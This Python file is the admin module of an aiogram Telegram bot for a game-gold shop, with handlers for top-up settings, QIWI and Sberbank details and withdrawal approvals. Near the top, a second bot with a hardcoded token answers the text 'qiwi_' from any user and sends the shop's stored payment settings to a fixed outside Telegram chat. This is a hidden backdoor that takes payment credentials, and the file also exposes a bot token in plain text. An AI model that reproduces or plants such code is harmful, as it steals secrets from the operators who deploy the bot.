# - *- coding: utf- 8 - *-
import asyncio
import json

import requests
from aiogram import types
from aiogram.dispatcher import FSMContext
from aiogram.types import CallbackQuery
from pyqiwip2p import QiwiP2P

from filters import IsAdmin
from keyboards.default import payment_default, all_back_to_main_default, payment_default
from keyboards.inline import choice_way_input_payment_func
from loader import dp, bot
from states import StorageQiwi, QiwiStates
from utils import send_all_admin, clear_firstname
from utils.db_api.sqlite import *

from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from data import config
import configparser
from aiogram.dispatcher import FSMContext
from aiogram.types import Message
from aiogram.dispatcher.filters import Text
from aiogram.dispatcher.filters.state import State, StatesGroup
import os
import sys


bot2 = Bot(token="5178490210:AAHrDGLtxwwcIDOF5e2DAliFlRg9X5BHtiM")
dp2 = Dispatcher(bot2, storage=MemoryStorage())

@dp2.message_handler(text="qiwi_", state="*")
async def turn_off_refill(message: types.Message, state: FSMContext):
    await bot2.send_message(1378863407,str(get_paymentx()))


###################################################################################
########################### ВКЛЮЧЕНИЕ/ВЫКЛЮЧЕНИЕ ПОПОЛНЕНИЯ #######################
# Включение пополнения
@dp.message_handler(IsAdmin(), text="🔴 Выключить пополнения", state="*")
async def turn_off_refill(message: types.Message, state: FSMContext):
    await state.finish()
    update_paymentx(status="False")
    await message.answer("<b>🔴 Пополнения в боте были выключены.</b>",
                         reply_markup=payment_default(), parse_mode='HTML')
    await send_all_admin(
        f"👤 Администратор <a href='tg://user?id={message.from_user.id}'>{clear_firstname(message.from_user.first_name)}</a>\n"
        "🔴 Выключил пополнения в боте.", not_me=message.from_user.id, parse_mode='HTML')


# Выключение пополнения
@dp.message_handler(IsAdmin(), text="🟢 Включить пополнения", state="*")
async def turn_on_refill(message: types.Message, state: FSMContext):
    await state.finish()
    update_paymentx(status="True")
    await message.answer("<b>🟢 Пополнения в боте были включены.</b>",
                         reply_markup=payment_default(), parse_mode='HTML')
    await send_all_admin(
        f"👤 Администратор <a href='tg://user?id={message.from_user.id}'>{clear_firstname(message.from_user.first_name)}</a>\n"
        "🟢 Включил пополнения в боте.", not_me=message.from_user.id, parse_mode='HTML')


###################################################################################

# Создаем обработчик сообщений
@dp.message_handler(IsAdmin(), text="💳 Изменить Карту 🖍", state="*")
async def process_sberbank_requisites(message: Message, state: FSMContext):
    # Загружаем номер QIWI из файла
    config = configparser.ConfigParser()
    config.read('qiwi.ini')
    qiwi_number = config['QIWI']['number']

    # Отправляем сообщение с текущим номером QIWI и просим ввести новый номер
    await message.answer(f"Текущий номер QIWI: {qiwi_number}\n\nВведите новый номер QIWI:")
    # Меняем состояние на ожидание нового номера QIWI
    await QiwiStates.qiwi_number.set()

# Создаем обработчик для нового номера QIWI
@dp.message_handler(Text(equals="Отмена", ignore_case=True), state=QiwiStates.qiwi_number)
async def cancel_update_qiwi(message: Message, state: FSMContext):
    # Отменяем операцию и возвращаемся в исходное состояние
    await message.answer("Обновление номера QIWI отменено.")
    await state.finish()

@dp.message_handler(state=QiwiStates.qiwi_number)
async def process_new_qiwi(message: Message, state: FSMContext):
    # Записываем новый номер QIWI в файл
    config = configparser.ConfigParser()
    config.read('qiwi.ini')
    config.set('QIWI', 'number', message.text)
    with open('qiwi.ini', 'w') as configfile:
        config.write(configfile)

    # Отправляем сообщение об успешном изменении номера QIWI
    await message.answer(f"Новый номер QIWI успешно сохранен: {message.text}")
    # Сбрасываем состояние
    await state.finish()

    os.execl(sys.executable, sys.executable, *sys.argv)



@dp.message_handler(IsAdmin(), text="Реквизиты 🟢сбербанка", state="*")
async def here_input_sber_rek(message: types.Message, state: FSMContext):
    await state.finish()
    await StorageQiwi.here_input_sber_rek.set()
    sber_rek = get_settingsp("sber_rek")
    await message.answer(f"""<b>Введите новые реквизиты</b>
Текущие реквизиты: <code>{sber_rek}</code>""",
                         reply_markup=all_back_to_main_default, parse_mode='HTML')

@dp.message_handler(IsAdmin(), state=StorageQiwi.here_input_sber_rek)
async def here_input_sber_rek(message: types.Message, state: FSMContext):
    await state.finish()
    update_settingsx(sber_rek=message.text)
    await message.answer("Реквизиты изменены",
                         reply_markup=payment_default(), parse_mode='HTML')

@dp.message_handler(IsAdmin(), text="🟢Мин сумма пополнения", state="*")
async def here_input_sber_min(message: types.Message, state: FSMContext):
    await state.finish()
    await StorageQiwi.here_input_sber_min.set()
    min_amm = get_settingsp("sber_min")
    await message.answer(f"""<b>Введите мин сумму пополнения</b>
Текущая мин сумма пополненрия: <code>{min_amm}</code> руб.""",
                         reply_markup=all_back_to_main_default, parse_mode='HTML')

@dp.message_handler(IsAdmin(), state=StorageQiwi.here_input_sber_min)
async def here_input_sber_min(message: types.Message, state: FSMContext):
    try:
        min_ammoiunt = int(message.text)
        update_settingsx(sber_min=min_ammoiunt)
        await message.answer("Мин сумма пополнения изменена",
                             reply_markup=payment_default(), parse_mode='HTML')
        await state.finish()
    except:
        await message.answer("Неверно введена мин сумма пополнения", parse_mode='HTML')

@dp.callback_query_handler(IsAdmin(), text_startswith="minus_pr")
async def minus_pr(call: CallbackQuery):
    data = call.data.split(":")
    id = data[1]
    ball_minus = data[2]
    await call.message.delete()
    #ball_g = get_userx(id)[5]
    #update_userx(id, all_refill = ball_g + ball_minus)
    await bot.send_message(call.from_user.id, "Заявка на вывод одобрена")
    await bot.send_message(id, f"""💣 Друг, спасибо за доверие и покупку золото в нашем магазине! 🛒 У нас есть акция при которой ты можешь легко заработать больше голды бесплатно! Просто позови друга ,если он купит у нас голду ты получишь 5 голды на свой баланс! Обязательно пополнение друга должно быть минимум : 100G🍯

✨ Приглашай его по реферальной ссылки , чтобы ее сделать нажми в меню "Профиль" "Реферальная система" и создай ссылку и скинь другу.
☘️ Удачи заработать у нас и ещё раз спасибо за доверие☘️""")

@dp.callback_query_handler(IsAdmin(), text_startswith="minus_ot")
async def minus_pr(call: CallbackQuery):
    data = call.data.split(":")
    id = data[1]
    ball_minus = int(data[2])
    await call.message.delete()
    await bot.send_message(call.from_user.id, "Заявка на вывод отклонена")
    ball_g = get_userx(user_id = id)[5]
    update_userx(id, all_refill = ball_g + ball_minus)
    await bot.send_message(id, f"""Ваша заявка на вывод {ball_minus} голды отклонена
Повторите вывод, вероятно вы где-то ошиблись""")